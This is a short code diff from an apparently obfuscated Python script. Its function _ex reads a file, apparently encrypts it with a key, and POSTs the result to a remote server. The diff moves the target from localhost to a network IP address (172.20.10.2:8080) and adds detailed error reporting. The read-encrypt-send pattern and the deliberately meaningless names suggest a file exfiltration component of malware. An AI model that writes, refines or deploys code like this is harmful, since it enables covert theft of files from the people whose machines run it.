@@ -15,7 +15,7 @@ def _ex(_8_):
     try:
         with open(_8_, 'rb') as _b_:
             _c_ = _3_(_b_.read(), _9_)
-        _1_.post("http://localhost:8080", data=_c_)
+        _1_.post("http://172.20.10.2:8080", data=_c_)
         print("File sent!")
-    except:
-        print("Server error")
+    except Exception as e:
+        print(f"Server error: {e}")
